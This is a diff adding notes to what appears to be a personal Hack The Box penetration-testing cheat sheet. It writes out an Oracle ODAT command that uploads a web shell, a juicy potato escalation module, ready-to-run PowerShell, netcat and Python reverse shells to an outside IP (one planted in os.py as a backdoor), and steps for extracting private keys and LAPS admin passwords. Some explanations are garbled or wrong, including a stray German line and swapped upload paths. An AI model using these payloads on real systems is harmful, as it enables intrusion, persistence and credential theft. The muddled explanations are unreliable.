@@ -25,3 +25,57 @@ https://cobaltstrike.com/
 Latereal Movement
 https://github.com/BloodHoundAD/SharpHound
 https://github.com/CoreSecurity/impacket
+
+Oracle TNS Exploit 
+https://github.com/quentinhardy/odat.git
+
+python3 odat.py dbmsxslprocessor -s 10.129.169.123 -U scott -P tiger -d XE — putFile “c:\inetpub\wwwroot” “shell.aspx” “/home/htb-pk2212/shell.aspx” — sysdba
+
+“python3 odat.py”: Starts the ODAT script with Python 3.
+“dbmsxslprocessor”: The module of the ODAT script used to attack the Oracle database.
+“-s 10.129.169.123”: The IP address or hostname of the Oracle database to connect to.
+“-U scott”: The user name (username) for accessing the Oracle database.
+“-P tiger”: The password to access the Oracle database.
+“-d XE”: The name of the Oracle database (here: “XE”).
+“ — putFile”: The option to upload a file from a local path to the target server.
+“”c:\inetpub\wwroot” “shell.aspx””: The path and filename of the local file to be uploaded (“c:\inetpub\wwwroot” is the local path and “shell.aspx” is the filename).
+“”/home/htb-pk2212/shell.aspx””: Der Pfad und der Dateiname auf dem Zielserver, wo die Datei hochgeladen werden soll (“/home/htb-pk2212” ist der Zielserver-Pfad und “shell.aspx” ist der Dateiname).
+“ — sysdba”: The option to log in as SYSDBA. SYSDBA is a privileged database user with extended rights and permissions in the Oracle database.
+
+What if based on SeImpersonatePrivelege is True, 
+This is one of the requirements when performing something known as a “Potato Attack”, there are a variety of Potato Attacks (juicy, rotten, hot, etc) but I believe they all follow the same basic principle.
+They somehow trick the machine you are on to generate an Authority/ SYSTEM token, which we can then impersonate. Hence why the SeImpersonatePrivilege is important.
+Use this exploit windows/local/ms16_075_reflection_juicy
+
+PHP TY[E JUGG;ING 
+https://0xdf.gitlab.io/2018/06/23/htb-falafel.html
+
+
+Default powershell reverse shell 
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.19',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+running nc.exe in windows environment
+1) in your kali linux, locate nc.exe, open web server listener for grabbing 
+C:\users\Destitute\Desktop\nc.exe -e cmd.exe 10.10.14.19 5555
+
+Linux Reverse Shell
+echo 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.19",5555)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /usr/lib/python2.7/os.py
+
+
+HTB academy Active Directory Enumration Module (all the modules are good but if you only want something to prepare for Active Directory then it is more than enough)
+
+Example of openssl - breaking .pfx into .key and .pem 
+openssl pkcs12 -in legacyy_dev_auth.pfx -out privateKey.key -nocerts -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -out certificate.pem -nokeys -clcerts
+
+
+Powershell History File 
+C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+
+Read Password
+To read the LAPS password, I just need to use Get-ADComputer and specifically request the ms-mcs-admpwd property:
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+REfer this when playing with sql injection 
